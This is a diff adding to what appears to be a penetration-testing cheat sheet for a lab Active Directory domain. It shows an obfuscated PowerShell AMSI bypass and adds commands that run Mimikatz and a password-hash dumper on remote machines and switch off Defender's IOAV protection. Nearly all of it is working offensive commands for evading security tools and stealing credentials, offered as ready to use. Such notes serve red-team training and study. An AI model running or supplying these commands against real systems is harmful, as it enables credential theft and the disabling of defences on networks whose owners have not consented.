@@ -20,6 +20,25 @@ AMSI bypass
 S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
 
+Run remote command
+```powershell
+Invoke-Command
+Invoke-Command -Scriptblock {Get-Process } -ComputerName (Get Content <list_of_servers>)
+Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
+Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
+$sess = New-PSSession -ComputerName dcorp-dc
+Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
+Enter-PSSession $sess
+Invoke-Command -ScriptBlock ${function:Get-PassHashes} - ComputerName (Get-Content <list_of_servers>) -ArgumentList
+```
+Example of run remote command
+```powershell
+$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
+Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
+Invoke-command -ScriptBlock {Invoke-Mimikatz} -Session $sess
+Enter-PSSession $sess
+```
 
 ## Enumeration
 
